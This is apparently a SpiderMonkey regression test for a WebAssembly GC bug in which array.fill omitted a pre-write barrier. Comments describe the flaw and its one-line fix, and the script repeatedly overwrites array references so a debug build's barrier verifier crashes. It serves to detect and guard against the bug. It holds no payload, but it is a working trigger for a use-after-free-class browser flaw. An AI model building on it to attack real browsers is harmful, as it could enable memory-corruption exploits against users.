// CVE-2026-2767 / Bugzilla 2013741 — WASM GC array.fill missing pre-write barrier
// MFSA 2026-15 (sec-high). Fix d867a6f69b9f0 (Ben Visness, 2026-02-09, r=rhunt).
//
// js/src/wasm/WasmBaselineCompile.cpp:emitArrayFill emitted the per-element
// store with `PreBarrierKind::None`. For WASM GC array element writes that
// overwrite an existing reference, the pre-write barrier is required so that
// SpiderMonkey's snapshot-at-the-beginning incremental marker can mark the
// reference being overwritten before it is lost. Without the barrier, an
// incremental marking pass that has not yet visited the old element value can
// drop it from the live set; the swept object becomes a dangling reference.
//
// In an ASAN+debug build with `gczeal(4, 1)` (pre-write barrier verifier),
// every barrier-less store into a GC slot is detected immediately as an
// assertion failure / MOZ_CRASH from the barrier verifier.
//
// Fix: change `PreBarrierKind::None` to `PreBarrierKind::Normal` in
//      BaseCompiler::emitArrayFill, so emitGcArraySet emits the pre-barrier.

// Enable pre-write-barrier verification — this is the most reliable way to
// surface missing pre-barriers without relying on incremental GC interleaving.
gczeal(4, 1);

const bin = wasmTextToBinary(`(module
  (type $A (array (mut externref)))
  (func (export "make") (param $n i32) (result (ref $A))
    (array.new_default $A (local.get $n)))
  (func (export "fill") (param $a (ref $A)) (param $v externref) (param $n i32)
    (array.fill $A (local.get $a) (i32.const 0) (local.get $v) (local.get $n)))
)`);

const inst = new WebAssembly.Instance(new WebAssembly.Module(bin));
const make = inst.exports.make;
const fill = inst.exports.fill;

// Build a fresh array and seed every slot with an externref to a live JS
// object. The seeding go through the same vulnerable array.fill path that
// the second fill below uses to OVERWRITE existing references.
const arr = make(64);
const seed = { tag: "seed" };
fill(arr, seed, 64);

// Now overwrite every slot — each per-element store hits the missing
// pre-write barrier. With gczeal(4,1) the pre-write-barrier verifier
// catches the first barrier-less ref store immediately.
const replacement = { tag: "replacement" };
fill(arr, replacement, 64);

// In case the verifier didn't catch it on the first call, run again with a
// freshly allocated value to force allocation pressure between fills.
for (let i = 0; i < 16; i++) {
  fill(arr, { round: i }, 64);
}

print("done");
